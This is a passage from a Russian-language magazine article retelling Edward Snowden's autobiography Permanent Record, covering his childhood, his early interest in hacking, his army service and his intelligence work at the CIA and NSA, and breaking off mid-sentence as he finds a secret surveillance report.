у маленького Эдварда изрядный интерес. Но однажды отец при нес домой
целый компьютер Commodore 64. Принес вечером, когда Эдварду уже было
положено спать. Что, разумеется, не помешало ему совершить разведыва‐
тельную операцию и увидеть, как отец подклю чает таинс твенный аппарат
к телевизору и что‐то на нем делает — а картинка на экране телевизора отве‐
чает на его действия!
   Тут‐то Эдвард и понял, чем по‐настоящему хочет заниматься в жизни.
  А потом он догадался, что его отец игра ет на этом аппарате в игры —
в  Tetris, Arcanoid и симулятор вертолета  Choplifter! Последнее вызвало
у Эдварда безудержный вос торг, и отец наконец‐то обнаружил, что за ним
наблюдают, — и, разумеется, посадил сына рядом с собой и дал ему в руки
второй джойстик. Неподключенный, правда, — но Эдварду хватило и этого.
  На следующее Рождес тво Эдварду подари ли NES, и ребенок выпал
из мира. Приставка дала ему много ценных жизненных уроков: The Legend
of Zelda научила его, что мир существу ет, чтобы его исследовали, Mega
Man — что у врагов есть чему поучиться, а Duck Hunt — что иногда над тобой
смеются, но это не значит, что в смеющихся следует стрелять. А самый цен‐
ный урок ему преподали братья Марио — и суть урока была в том, что идти
по жизни можно только вперед, а вернуться в прош лое невоз можно.
  А чтобы юный Эдвард окончательно усво ил, что все в жизни течет и порой
утекает, через какое‐то время приставка сломалась.
  Беря пример со сво его отца, Эдвард решил ее починить. Его хватило
на то, чтобы разоб рать ее и соб рать — но делу это не помогло. На помощь
был призван отец, который объяснил ему, что в прис тавке к чему, пред‐
положил, что в ней что‐то рас паялось, и отвел Эдварда к себе на работу, что‐
бы воспользоваться тамошним оборудо ванием для починки прис тавки. Ну
и чтобы впечатлить сына — видимо, отец счел его интерес к электронике дос‐
таточно серьезным.
  Там Эдвард впервые уселся за клавиатуру и под отцовским руководством
написал первую в жизни программу — и даже не Hello World!


10 INPUT "WHAT IS YOUR NAME?"; NAME$
20 PRINT "HELLO, " + NAME$ + "!"

И когда программа запус тилась, спро сила «КАК ТЕБЯ ЗОВУТ?» и выдала
«ПРИВЕТ, ЭДДИ!», Эдвард Сноуден почувс твовал себя просветленным. Он
понял, что, если правиль но дать компьюте ру инс трукцию, тот ее выполнит —
даже если программисту семь лет. Машин ная справедливость покорила
Эдварда. Предсказуемость, рациональность и контроль — только за кла‐
виатурой компьютера можно их найти, понял он.
   Что ж, этот урок силь но помог Эдварду: к девяти годам его жизнь сильно
изменилась.


Сво бода мысли и сво бода действий
Родители Сноудена переехали. Теперь они работали в Форт‐Мид, а жили
в Крофтоне. И то и другое место — не совсем города. Первый — скопление
штаб‐квартир правитель ственных агентств, вто рой — аккуратные «спальные
городки» с белыми заборчиками непода леку. И почти все, кто живут там,
работают на правительство за весьма прилич ные зарплаты.
  В новой шко ле у Эдварда дела шли не совсем гладко — но пос ле пере‐
езда его родите ли купили нас тольный компьютер Compaq Presario 425. В нем
были процессор Intel 486 25 МГц, 200‐мегабай тный жес ткий диск, виде‐
оадаптер с 256 цветами и модем, по которому уже можно было выходить
в интернет. Также на нем была легендарная игра Loom — в ее сюжете тайное
общество Ткачей сооружает магическую прялку, которая плетет тонкие узоры
в ткани реальности, а юный герой, открывший тайну прял ки, вынужден скры‐
ваться в изгнании (я предупреждал, что некоторые литературные приемы
в этой книге довольно пря молинейны).
  Сноуден не жалеет доб рых слов и ярких кра сок для описания интернета
начала девяностых. Там, по его сло вам, было море информации, свобода
и здоровая смесь искреннего желания помочь друг дру гу с духом сорев‐
нования, выпендрежем и провокацией. И всякому, мол, там были рады, даже
ребенку, а если где и не были, то дос таточно сменить псевдоним и слегка
изменить мнения и манеру письма, чтобы поп робовать еще раз. Чем Сно‐
уден, по его словам, неоднократно и пользовал ся — его основными инте‐
ресами в подростковом возрасте были споры в интернете, игра Ultima Online,
а также чте ние всего, что попадалось под руку, особенно околокомпьютерной
тематики.
  К подростковому воз расту этот интерес прицель но обратил ся к вопросам
системной безопасности и ее преодоления. Как остроумно замечает Сно‐
уден, подростки почти все хакеры по натуре — сама жизнь их заставляет. Они
сами  чувствуют  себя  взрос лыми,  но  взрослые  считают  их  детьми.
И волей‐неволей приходится учиться взламывать систему надзора и правил.
Ведь везде, где есть пра вила, писаные или неписа ные, если их внимательно
изучить — можно найти разницу между тем, как создатели системы хотели,
чтобы она работала, и тем, как она работает в действительнос ти. Так что
на самом деле, считает Сноуден, хакеры не нарушают правила, а разоб лача‐
ют и опровергают их.
  На примере своих школьных лет Сноуден рассуждает о системе власти
и социальной политики. Люди, которые устанавлива ют правила, могут сколько
угодно говорить, что они делают это в твоих интересах, — но на практике
очень часто оказывается, что пра вила, ими установленные, поддерживают их
интересы и могут быть перес мотрены в любой момент. Еще в школе ему
пришло в голову, что многие системы имеют один и тот же принципиальный
изъян: те, кто создают правила, не имеют никаких поводов их менять, потому
что это им невыгодно — даже если это выгодно всем остальным пользовате‐
лям системы.
  Не желая смириться с таким положением вещей, поняв, что, сле дуя пра‐
вилам, систему изменить невоз можно, Эдвард Сноуден, как и все подростки,
к тринадцати годам обратился к сопротивлению. Он был недостаточно «кру‐
тым парнем», чтобы бунтовать в обычной подростковой манере — посредс‐
твом вандализма и наркотиков. Пришлось научить ся обманывать систему.
  Прогулы были чреваты лишением компь юте ра. Но, внимательно изучив
систему выставления оценок, Эдвард понял, что самый большой вклад
в годовые оцен ки вносят разные виды проверочных работ. С ними у него
проблем не было — и зна чит, домашние задания можно было просто не сда‐
вать! Какое‐то время это прокатывало — пока учитель не додумал ся спро‐
сить, в чем же тут дело. Эдвард не удержался и похвастался своим откры‐
тием. Это привело к введению квоты на минималь ное количество сданных
заданий и нудной беседе с учителем на тему того, что нужно думать о своем
будущем, прилежно тру диться и ста рать ся работать на свое личное дело,
портфолио, резюме... сло вом, your permanent record.
  Тем не менее, взло мав школьную систему, Эдвард получил достаточно
свободного времени, что бы с головой погрузить ся во взлом сис тем компь‐
ютерных. Его учителями стали хакерские зины 2600 и Phrack — со всей при‐
лагающейся антиавторитарной контркультурой. Как пишет Сноуден, это были
времена свободы и безграничного любопытства — когда многие хакеры
занимались взломом не ради денег, а ради сла вы и нас лаждения самим про‐
цессом и своей крутизной. Так же и сам Сноуден интересовал ся в основном
взломом игр и фрикингом, а о банковских акка унтах и кре дитных карточках
даже и не помышлял. Его интересовали прин ципиальные вопросы безопас‐
ности и системной архитектуры. И чем больше он изучал, тем больше осоз‐
навал, как много вокруг дыр в разных системах, которые, по идее, должны
быть надежными и защищенными.
  Показательный пример — Лос‐Аламос ская национальная лаборатория
ядерных исследований. Сноуден из любопытства зашел на ее сайт и точно
так же из любопытства обна ружил, что на сай те открытая структура папок. То
есть по ссылке вида website.com/files можно было получить доступ
ко всем фай лам на сервере. Даже тем, к которым у посетителей не должно
быть доступа. Такие уж были времена.
  Вдоволь начитавшись внут ренней переписки и личных данных сотрудников
лаборатории, Эдвард Сноуден поступил, как учили его родители. Он сделал
доброе дело и написал веб‐мас теру сайта.
  Никакой реак ции на его пись мо не последовало. Шли дни, ответа не было,
дыра оставалась открытой.
  Эдвард не успокоился. Он позвонил по телефону лаборатории, добился,
чтобы его соединили с IT‐отделом, и ста ратель но рас сказал о проблеме
автоответчику.
   Спустя несколько недель в их доме раз дался телефонный звонок. Трубку
взяла мать Сноудена. Услышав, откуда звонят, она побледнела и страшным
шепотом спросила у Эдварда, что он нат ворил. Пожалев нервы своей матери,
Сноуден в беседе по телефо ну еще раз перес казал, в чем было дело. Сот‐
рудник лаборатории поб лагода рил его за бдитель ность, сообщил, что дыру
прикрыли, и поинтересовался, не ищет ли его собесед ник работу. Узнав о его
возрасте, прав да, сказал, что все‐таки при дется подождать совершенно‐
летия, — но предложения сво его отменять не стал.


ЗДРАВСТВУЙ, ОРУЖИЕ
Но в Лос‐Аламос Сноуден не попал. Еще до совершеннолетия в его жизни
произошло несколь ко важ ных и неприятных событий. Его родители раз‐
велись, что повлекло за собой очередной переезд. Потом он заболел
инфекционным мононуклеозом, болезнь протека ла тяжело, и оставалось
только лежать в кровати и читать. Высокая температу ра и чте ние впе ремешку
«Манифеста хакера», «Лавины» Нила Стивенсона и «Властелина колец» при‐
водило к бредовым снам, в которых из‐под кро вати вылезал Голлум и ныл
о том, что «информация хочет быть с‐с‐свободной».
  Заодно Эдвард накопил кучу долгов в школе и решил их не сдавать, а най‐
ти иной жизненный путь. Осо бенно ему не хотелось писать автобиографичес‐
кое сочинение. Эта деталь подводит его к размышле ниям о приватности.
Сноуден уподобляет ее шифрованию — твоя истинная суть становится дос‐
тупной лишь тем, у кого есть ключ дешифровки, — и утверждает, что всегда
был склонен к такого рода скрытности, что работа в разведке еще больше
развила в нем эти склонности и что лишь сей час он нашел в себе силы пре‐
одолеть их и рассказать правду — не о том, что он смог узнать или сделать,
а о себе самом. Что он наконец‐то готов сдать свое ненапи санное автобиог‐
рафическое сочинение.
  На этом, пожалуй, заканчивается детство Сноудена. В следующей главе
у него уже есть машина и работа — он занялся веб‐дизайном вместе со сво‐
ей подругой с курсов японского (которые, разумеется, включали в себя прос‐
мотр аниме — и разумеется, самым любимым у Эдварда был «Призрак в дос‐
пехах»). Все его мысли занимала работа, кредиты на профессиональное
образование, аниме и симпатии к подруге — которая, к сожалению, уже была
замужем за сотрудником АНБ.


9/11
Дело было в 2001 году. Нетрудно понять, какое со бытие происходит дальше
и резко меняет судьбу не только Эдварда, но и всей Аме рики и все го мира.





  Один из угнанных самолетов протара нил Пентагон — где у Сноудена
  могли быть родственники

Сноуден вспоминает, как пытался дозвониться до матери и выяс нить, в Пен‐
тагоне сейчас его дед или нет (он был в Пентагоне, но остался жив).
Как бежали из штаб‐квартиры АНБ панику ющие сотрудни ки и что пробка из их
машин начиналась еще на парковке. Вспоминает он и о том, что началось
буквально на следующий день пос ле трагедии — и так и не прекратилось.
  Сейчас трудно в это поверить, но, по словам Сноудена, до 11 сентября
никаких особых мер безопасности в окрес тностях Форт‐Мид не было. Обыч‐
ный американский гражданин мог спокойно проехать по шос се с видом
на штаб‐квартиру АНБ. Теперь там повсюду воору женные до зубов полицей‐
ские кордоны и постоянные проверки документов. Такие же перемены про‐
изошли и со всей Америкой. Потрясенное и напуганное общество желало
знать, кто его враги, и пос корее с ними рас править ся. На каждом доме реяли
американские флаги, а на стрельбищах в качес тве мишеней появились силу‐
эты мужчин в тюрбанах.


             INFO

                      Если тебе хочется освежить в памяти трансфор‐
                     мацию, которую пережило американское общес‐
                        тво после 11 сентября 2001 года, можешь обра‐
                         титься,  например,  к  работам  Майкла  Мура
                      или Трея Паркера и Мэтта Сто уна — «Фарен‐
                         гейт  9/11»  и  «Отряд  „Америка“:  Всемирная
                      полиция» — или любых других представителей
                     многочисленных критиков президентства Джор‐
                     джа Буша — младшего.


Эдвард Сноуден тоже поддался всеобщему патриотическому порыву. Он
очень хотел послужить своей стра не, но выяс нил, что устроиться на работу
в АНБ или ЦРУ просто так он не может — не хватает университетского дип‐
лома. Но в мире после 11 сентября исключения были на каждом шагу — осо‐
бенно для отслужив ших в вооруженных силах.
   Так Сноуден одновременно пос ледовал семейной традиции и нарушил
ее — потому что выбрал служ бу в армии, которую его родственники
из береговой охраны не особенно уважали.


Ты нужен дяде Сэму
Америка готовилась к новой войне и нуждалась в новых солдатах. Это и
высокие баллы, которые Сно уден набрал на входном тестировании, давало
ему шанс попасть не абы куда, а в Силы специального назначения Армии
США — также известные как «Зеленые береты». Рекрутер обещал Эдварду,
что если он постарается, то сможет стать сержантом‐инженером, сер‐
жантом‐разведчиком или сержантом‐связистом.
   Так Эдвард попал в фильм «Цельнометаллическая оболочка». Со вре мен
Вьетнамской вой ны ничего осо бо не изменилось — раз ве что слова в стро‐
евой песне‐кричалке (мотив остался преж ним, традиционным).



     Пойду я к пещере,
      Где засел тер рорист,
     Дос тану гра нату
     И швыр ну ее вниз!
       Ле вой, пра вой, левой, пра вой — давай, давай, стре ляй!
      Кто против нас — луч ше сам помирай!





Незамысловатые будни армейской учеб ки и бесконечные марш‐броски
довели Сноудена до трещин в костях ног. С ними он не мог проходить тре‐
нировки по прыжкам с парашютом. Прощай, мечта о спецназе. Теперь
Эдварду светило то, чего он так не хотел, — перспектива служить обычным
пехотинцем или, что еще хуже, сисадмином в техподдержке при каком‐нибудь
штабе.
  Армейские врачи предложили ему подписать упрощенное расторжение
контракта с вооруженными силами — для тех, кто отслужил меньше полугода.
Только подписав, Эдвард понял, что теперь армия не обязана платить за его
медицинскую страховку. Что ж, хотя бы кос тыли оста вили бесплатно.


В сво бод ном поиске
Но Сноуден все еще был полон идеализ ма — и знал, куда его применить. Он
по‐прежнему хотел работать в раз ведке и был уверен, что там его мозги
и технические навыки принесут пользу. Но чтобы попасть туда, нужно было
получить допуск к секретной информации — долгий процесс, после написа‐
ния заявки состоящий в основном из ожидания, пока правительственные
агентства выясняют, что они о тебе знают и нас колько ты заслуживаешь
доверия. Семейная история Сно удена и его опыт в армии помогли ему
получить высочайший уровень допус ка — TS/SCI (Top Secret/Sensitive Com‐
partmented Information). Что имен но проверяют и каким образом, точно неиз‐
вестно — но могут опрашивать зна комых, соседей, работодателей, а также
проверять, есть ли у тебя кредиты и регулярно ли ты делаешь по ним выплаты.
  Ожидая решения своей судь бы, Сноуден много вол новал ся, не входит ли
в проверку его прошлого анализ коммента риев в интернете, которые он
оставлял в юности. Многие из них казались ему постыдны ми или глупыми,
по многим вопросам он изменил свое мнение. Ему очень хотелось удалить
их, чтобы никто их боль ше никогда не увидел. Но в конце концов он не стал
это делать — решив, что они часть его прошлого, и что если отказывать себе
и другим в праве на ошибку, то всегда придется притворяться безупречным
и бояться разоблачения. Всему этому он предпочел ответственность и готов‐
ность расти, меняться, но помнить о том, кем он был раньше.
  В этот же период жизни он поз накомился с Линдси Миллс. Знакомство
произошло на сайте Hotornot, на котором можно было просматривать фотог‐
рафии людей и отмечать, нравятся они тебе или нет. Если твоя фотография
нравится челове ку, фотография которого понравилась тебе, открывалась
возможность переписки. Звучит очень зна комо, и неудивительно — именно
этим сайтом вдохновлялся, например, Марк Цукерберг, когда создавал Face‐
mash — прототип Facebook, да и популярный сейчас Tinder использует ту же
схему.
  Забегая вперед, скажу, что с Линдси Миллс Сноудену очень повез ло
и начало везти чуть ли не с их первого сви дания — они катались на ее
машине по ее любимой дороге и без конца раз говаривали. А еще она помог‐
ла ему тренироваться перед проверкой на детекторе лжи — и кто знает,
может быть, именно поэтому он получил свой желанный допуск.





  Так Линдси и Эдвард нарядились для Хэллоуина 2015 года — в наряды
  Кармен Сандиего и Уол ли из «Где Уолли?». Потому что их тоже разыс ‐
  кивает весь мир. Фон, разумеется, прифотошоплен

Ему было 22 года, и он чувс твовал себя королем мира. Дверь в раз ведку была
открыта, и он был влюблен.
  На этом кончается первая часть кни ги, медленная, повес твовательная
и похожая на сентиментальное кино о жизни простого американского парня.
Впереди ждет шпионский триллер.


                                     Продолжение статьи →
ПРИВАТНОСТЬ           ← НАЧАЛО СТАТЬИ

  СИСАДМИН ПРОТИВ
         СИСТЕМЫ
              О ЧЕМ ЭДВАРД СНОУДЕН НАПИСАЛ
            В АВТОБИОГРАФИИ PERMANENT RECORD





ВНУТРИ СИСТЕМЫ
Прежде чем окунуться в пучину шпионских страстей, Сноуден уделяет
еще немного времени философии и рефлексии. Он рассуждает о том, что
был идеалистом, но его идеалы были расплывчаты и пол ны противоречий,
а образ мысли во многом опирался на взгляды его родителей, родс твенников
и их коллег — профессиональных американских чиновников, исповедовавших
своего рода технократичес кую меритократию.
   То есть считавших, что нужно просто хорошо делать свою работу, а все
остальное — пустые раз говоры. Это интересно сочеталось с тем, что именно
эти люди выполняют всю работу правительства и в некотором роде сами
являются правительством — порож дая классичес кую картину высокомерной,
самозамкнутой кор поративной бюрократии (веро ятно, неплохо знакомой
многим людям, которые работа ют не на пра вительство).
  Еще Сноуден рассуждает о том, что он не хотел быть программистом
или электронным инженером. Его влекли к себе сис темы, он хотел анализи‐
ровать их, поддерживать их в рабочем сос тоянии, чинить их поломки и стро‐
ить новые системы из имеющихся компонентов. Для него системы были
похожи на правила — с внутренней логикой, которую можно было исполь‐
зовать или обманывать. Из этой логики следова ло, что когда в системе что‐то
шло не так, истинная причина этого часто отличалась от наблюдаемых сим‐
птомов. И ему нравилось докапывать ся до исходной причины и решать имен‐
но ее.
   Эти склонности помогали Сноудену в карь ере ровно до того момента, ког‐
да они же ему и помеша ли — когда он применил их не к той системе, где
работал, — к Системе с большой буквы. Надеюсь, тебе еще не надоел раз‐
говор об идеалах Сноудена, потому что он повторится и в книге, и в этой
статье еще не раз.


Анархия иерархии
Получив свой желанный допуск, Эдвард Сноуден с удивлением узнал, что
вместо того, чтобы служить своей стра не, ему придется на нее работать. Суть
в том, что вместо государственной службы, которая досталась в свое время
его отцу и деду, ему предлагали работу по временным контрактам в раз ных
компаниях, которые сами, в свою очередь, были на контрактах у разных пра‐
вительственных агентств.
  По словам Сноудена, все устроено именно так, во‐первых, чтобы обходить
квоты на наем пол ноценных сотрудников в федеральные агентства, во‐вто‐
рых — для разнообразно го лоб бирова ния и манипу ляций с бюджетами (а так‐
же чтобы предоставлять работу бывшим политикам — «тепленькие местечки»
для  тех,  кто смог посодействовать  заключению выгодных  контрактов),
а в‐третьих — чтобы сот рудникам таких компаний можно было поручать
самые разные сомнительные задания, а потом сваливать на них всю ответс‐
твенность в случае, если что‐то из это го всплывет.


Исполни тели гряз ных дел
Про дурную славу компании Blackwater зна ют, наверное, все. Но Сноуден
упоминает компанию CACI, про тив которой с 2004 года тянется дело об учас‐
тии ее сотрудников в пытках в тюрь ме Абу‐Грейб — где они отдавали ука‐
зания о том, что делать с заключенными, а их юрис ты теперь называют эти
действия «несомненно, унизительными, но недостаточно суровыми, чтобы
считаться пытками».
  Сноуден пишет и про корпорацию Titan, тоже замешанную в этом скандале
и во многих других грязных историях: нелегальное спонсирование выборов
президента африканской стра ны Бенин, контра банда пяти тонн кокаина
из Венесуэлы,  связи  с  человеком,  через  которого проходили деньги
для арабских террористов... Впрочем, такие компании с радостью берут
заказы не только у пра вительственных агентств, но и у глобальных кор‐
пораций. Например, Accenture или Cognizant скандально известны в свя зи
с историями про плохие усло вия работы модераторов контента в крупнейших
соцсетях.


Сначала Сноуден работал над совмес тным проектом Уни верситета Мэрилен‐
да и АНБ — Центром продвинутого изучения языков (CASL, the Center for Ad‐
vanced Study of Language). АНБ был нужен машинный перевод с арабских
языков — чтобы не возиться с поиском носителей языка, которые могли бы
пройти проверку благона дежности.
  Но Сноуден попал на проект в нас только ранней стадии его запус ка, что,
по сути, он был ночным сторожем на стройке. Так что он внимательно сле дил
за новыми карьерными возможностями и посещал ярмарки вакансий для кан‐
дидатов с сек ретными допусками. В итоге он устроился в компанию
COMSO — это субподрядчик в BAE Systems — американском подразде лении
British Aerospace, который выполняет заказы на американскую разведку.
  Но в офисе своего нового работо дателя он был всего лишь раз — когда
обсуждал зар плату. В CASL ему платили 30 тысяч дол ларов в год. На новом
месте Сноуден рассчитывал на 50 тысяч, но рекрутер убедил его согласиться
на 62 тысячи — чтобы и самому получить процент побольше.


             INFO

                      Если тебе интересно узнать, как обстоят дела
                        в сфере военных высоких технологий в США и что
                      там  с  «распилом  и  откатом»  (по‐английски
                        это будет cut and kickback — то есть ровным сче‐
                      том то же самое), то можно начать с фильма
                       The Pentagon Wars либо мемуаров Skunk Works
                      или The Dream Machine. Но если вкратце — все
                      описан ные в этой статье злоупотребления, сом‐
                        нительные практики, безалаберность и бардак —
                      не  исключения,  а  давно  устоявшаяся  норма
                       во всех правительствен ных конторах Америки (да
                      и не ее одной, наверное).


Но конечным заказчиком в этой цепи субподрядчиков было ЦРУ. И именно
в тамошнюю штаб‐квартиру Сноудена направили на инструктаж. Там он ока‐
зался в компании таких же «компь ютерных чуваков», как и он сам, — у некото‐
рых были татуировки, или пирсинг, или крашеные волосы. «Так вот ты какое,
глубинное государство», — ска зал один из них, гля дя на остальных, и они
дружно расхохотались. Инструктаж, который их ждал, тоже не содержал
ничего нового для них — им сказали, что они избраны для великой чести быть
членами технологической элиты, но они это зна ли еще до того, как устро‐
ились в разведку.
  А под конец инструктажа им показа ли портреты людей и сказали, что эти
ребята нарушали правила и теперь сидят в подвалах. И что некоторые про‐
сидят там до самой смерти.


             INFO

                 Любопытно, что похожая сцена была в книге
                        «Аквариум» советского перебежчика на Запад —
                     бывшего офицера ГРУ Виктора Резуна. Только
                      там человек в под вале был один и не на фото,
                       а на кинопленке. И там с ним делали очень
                       нехорошие вещи.



Ноч ной дозор
Первое место работы Сноудена в ЦРУ было командой, обслу живающей сер‐
веры. Бункер команды располагался по соседс тву с отделом базовой тех‐
поддержки — Сноуден пишет, что там работало много женщин, а также людей
в возрасте (о них ходили слухи, что это полевые агенты, которым не повезло
с карьерой). Сноуден относился к ним с симпати ей, но все‐таки это были
люди из другого мира. Они работа ли в дневную смену, а он — в ночную, когда
огромное здание штаб‐квартиры превращалось в декорацию к фильму ужа‐
сов. Его должностными обязанностя ми было следить, чтобы серверы работа‐
ли нормально. Работать нуж но было через консоль или через лестни цу и тун‐
нель, ведущие в дата‐центр с серверными стой ками.
   Единственным напарником Сноудена был человек по имени Фрэнк — быв‐
ший флотский радист в возрасте за пять десят, который в основном руководс‐
твовался принципом «работа не волк, в лес не убежит». Но, несмотря на его
отношение к работе, увольнять его почему‐то не спешили — и лишь спустя
какое‐то время Эдвард понял, что Фрэнк был единс твенным человеком, сог‐
ласным работать в ночную смену и умеющим обращаться со старой проп‐
риетарной системой резервного хранения данных на пленке. Только Фрэнк
умел ее менять.
   Что ж, Эдвард быстро взял с него при мер, написал несколько скриптов
для автоматизации работы — и обнаружил, что делать на смене ему стало
совершенно нечего.
   Тут‐то он и открыл для себя внутриправительственную локальную сеть,
в которой был свой аналог «Фейсбука», «Википедии» и «Гугла» (сделанный
в Google же).
  Насмотревшись  на  Фрэнка  и  начитавшись  внутренних  новостей,
в которых, в отличие от официальных, рас кры вались «источники, пожелавшие
остаться неизвестными», Сноуден понял, что он не желает быть очередным
Фрэнком. Он принялся пробовать ся на раз личные технические вакансии
внутри агентства в других странах, и спустя нес коль ко месяцев ему повезло.


Курс молодо го раз ведчика
Но перед тем, как Сноудену отправить ся «в далекие страны, к интересным
людям», его ждал новый курс обучения — базовая телекоммуникационная
тренировочная   программа   (BTTP)   на  дол жность  офицера‐техника
по информационной безопасности (TISO). Проходить ее он должен был
в таинствен ном «Хол ме» — или, как он назывался офи циально, тре нировоч‐
ном центре Уоррентон. Там учили по‐настоящему серьезным делам — дол‐
жность TISO требует быть мастером на все руки: радис том, электриком,
механиком, криптографом и в целом «компь ютерщиком». В его обя занности
входят вещи от настройки спутниковой антенны до ремонта кондиционера
в посольстве (ты же не дума ешь, что в посольстве работают одни дипломаты
и клерки?). Он отвечает за уничтожение всей секретной информации и элек‐
троники, если придется срочно уно сить ноги. Любая технология, любые усло‐
вия — он должен уметь с ними справиться.
  Одно из тренировочных упражнений требовало затащить на кры шу трид‐
цатикилограммовый чемодан и с помощью компаса и листка с координатами
найти среди звезд в небе спутник‐шпион, чтобы выйти с ним на связь
по зашифрованному радиоканалу. Другой курс рассказывал о методах
защиты от перехвата ван Эйка. И это был первый год, когда курсантам можно
было не изучать мор зянку.





  Фотографий из это го мес та в Сети немного, но выглядит оно как‐то так

Однако студенты этих курсов были вынуждены жить в заштатном гряз ном
мотеле. Того требовала конспирация — мотель специально держали в нас‐
только плохом состоянии, чтобы ни один нормальный человек не пожелал там
остановиться. И когда в нем раз валилась лес тни ца, курсанты собрались
писать жалобу начальству. А донести ее до началь ства выз вался идеалист
Сноуден. В итоге он выбил для своих сокурсников отель получше, но получил
выговор и лишился возможности попасть в горячую точку, куда он страстно
желал.
  Вместо этого его отправили работать в посольство в Женеве. Сноуден
был очень разочарован — но по крайней мере туда могла приехать Линдси.


ЗАНАВЕС ПРИОТКРЫВАЕТСЯ
Женева оказалась местом, где бурно взаимодей ствовали старые и новые
методы ведения разведки — на американском жаргоне HUMINT и SIGINT, то
есть human intelligence и signal intelligence. Секреты мировых финансовых
потоков выведывали как обаятельные ребята с хорошо подвешенным язы ком
и карманами, набитыми взятками, так и без душные машины для перехвата
информации всех сор тов. И, нес мотря на вза имное недове рие и конкурен‐
цию, сотрудничать обоим направлениям при ходилось. Например, отвечать
на вопросы вроде «Предположим, кто‐то вставляет флешку со шпионскими
программами в компьютер в зда нии ООН — каков шанс, что этого гипоте‐
тического кого‐то пой мают?».
  Сноуден пишет, что среди прочих обязанностей он консультировал мес‐
тных сотрудников ЦРУ по вопросу анонимности при поиске в интернете. В те
годы для того, чтобы с условной анонимностью просто работать с Google,
агенты ЦРУ использовали даже не прокси‐серверы, а физичес кие прокси —
организовывали подставную контору, якобы занимающуюся наймом пер‐
сонала, чтобы от ее имени отправлять запросы в поисковики. И неизбежно
кто‐нибудь из агентов рано или поздно «палил контору», заходя с того же
самого IP‐адреса в свой личный акка унт Facebook, где могло быть прямым
текстом указано, что он работа ет на правительство США.
   Если тебе кажется, что это какой‐то каменный век, то ты абсолютно
прав — Сноуден тоже так думал. В качестве куда более эффективной альтер‐
нативы он предложил цэрэушникам Tor.


Обе зопасить, удержать, сохранить
В Женеве Сноуден провел с 2007 по 2009 год, а потом его ждал новый кон‐
тракт в Японии — формально он работал на компанию Dell, но конечным
заказчиком было Агентство национальной безопасности — самая технологи‐
чески продвинутая, самая богатая и самая зловеще‐таинственная спецслуж‐
ба США. В Японии у них имелось нес колько объектов, включая Тихоокеан‐
ский технический центр, скрытый на авиабазе Йокота. Туда Сноуден и отпра‐
вился.
  Он начал с работы над линиями связи, соеди няющими системы АНБ и ЦРУ
(с этими системами у него уже был опыт). Так он приобрел репутацию надеж‐
ного специалиста, способного решать сложные задачи. Так его и под ключили
к масштабному проекту, работая над которым он узнал много такого, чего
не хотел знать.
  По его словам, инфраструктура АНБ была гораз до более технологичес ки
продвинутой, чем у ЦРУ, — и настолько же безала бернее там подходили
к безопасности. Дело было плохо и с процедурами, и с шифрованием, и с
резервным копированием данных. Каждое крупное отделение спецслужбы
имело свой дата‐центр, но не вся информация из него пересы лалась на хра‐
нение в штаб‐квартиру. Но благодаря Сноудену они получили программу,
собирающую данные из всех разведцентров, сортирующую их, чтобы избе‐
жать дубликатов, и рассылающую обновлен ную базу данных во все дата‐цен‐
тры спецслужбы — чтобы не зависеть больше от одного централизованного
хранилища.
  Сноуден пишет, что в АНБ есть специальный генератор кодовых имен.
Положено брать из него бессмысленные наз вания для секретных программ,
но агенты отходят от пра вил, чтобы получать более крутые прозвища для сво‐
их детищ. Сноуден уверяет, что он не прибегал к таким уловкам и система
сама назвала его проект EPICSHELTER.


Дьявол в бумаж ных мелочах
И где‐то тут судьба нашего героя незаметно сделала очень важный поворот.
Привычка Сноудена собирать разнообразную информацию, не относящу юся
напрямую к его служебным обязанностям, и рабочий энтузиазм привели его
на конференцию по контрраз ведке. Он должен был выступить с докладом
о возможностях китай ских раз ведывательных служб сле дить за агентами
и информаторами американской раз ведки в интернете. И когда он прочитал,
как в Китае ведется широкомас штаб ная слежка, его техническая интуиция
напомнила ему: если что‐то воз можно сделать, то кто‐то это сделает и, ско‐
рее всего, уже сделал. Он задумался, как дела обсто ят в его родной стране.
  Сноуден утверждает, что в 2009 году эта тема его особо не вол новала. Он
искренне верил, что одно дело — китайский тоталитарный режим и его
великий китайский файрвол, а дру гое — Америка, где (как он полагал) спец‐
службы, конечно, следят за пользователями интернета — но только за теми,
кто заходит на сайты террористов. Направленная, а не широкомасштаб ная
слежка.


             INFO

                     Написан ное выше звучит несколько наивно, чего
                     сам Сноуден и не отрицает. Ведь еще в 2004 году
                         газета Washington Post писала про систему ECH‐
                      ELON, а в том самом 2009 году материал о ней
                    вышел даже на Хабре. В защиту Сно удена можно
                        сказать лишь то, что до его собственных разоб‐
                       лачений о масштабе и подробностях устройства
                         таких  систем информация  была обрывочной.
                     Про ту же систему ECHELON было известно, что
                         у нее есть ограничения по мас штабу и охвату
                      прослушки. К тому же официальные лица всегда
                        говорят «мы за вами совершенно точно не сле‐
                      дим» или «без комментариев» — так что до Сно‐
                       удена  доказательств  не  было.  Были  только
                       намеки, на которые можно было зак рывать глаза.


Заинтересовавшись вопросом, Сноуден поп робовал изучить историю с так
называемой President’s Surveillance Program, которая официально была объ‐
явлена закрытой в 2007 году пос ле длительного скандала с учас тием кон‐
гресса США. Суть скандала, если вкратце, была в том, что, согласно законо‐
дательству и Конституции США, следить за граж данами США без пос танов‐
ления суда незаконно, а законы должны соб людаться (права граждан других
стран — это уже совсем дру гой вопрос). Но, как обнаружил Сноуден, изучая
документы, после закрытия прог раммы были приняты законы с очень двус‐
мысленными формулировками, а сам представленный общественности док‐
лад о программе был настолько беден деталями, что Сноуде ну захотелось
найти в сети АНБ его изна чальную, неот редактированную версию.
  Ему это не удалось.
  Но спустя какое‐то время уда ча улыбнулась ему. В его обязанности вхо‐
дила проверка работы системы, которая следила, чтобы самые секретные
документы не хранились на менее защищенных компьютерах. Система
работала по ключевым сло вам и, если файл с клю чевым словом оказывался
на недостаточно защищенном жес тком диске, подавала сигнал, а Сноуден
проверял, не произошло ли ложного срабатывания. И кто‐то поместил чер‐
новик жутко секретного документа в систему, администратором которой был
Сноуден. Стоило ему увидеть гриф секретнос ти такого уровня, какого он
раньше никогда не видел, и заголо вок документа — и он не смог остановить‐
ся.


ДАН НЫЕ УДА ЛЕНЫ
Сноуден  сорвал  джекпот.  Этот  файл  силь но  отличался  от  доклада
для широкой публики — настолько, что делал пуб личную версию неприкры той
ложью. В нем подробно описывалась новая миссия АНБ — переход от слежки
за отдельными целевыми объектами к мас сированному сбору информации —
и обоснование для этого перехо да: у нас есть для этого мощности, и, значит,
мы дол жны их использовать.
   Утверждалось, что по ана логии с «раз рывом по бомбардировщикам»
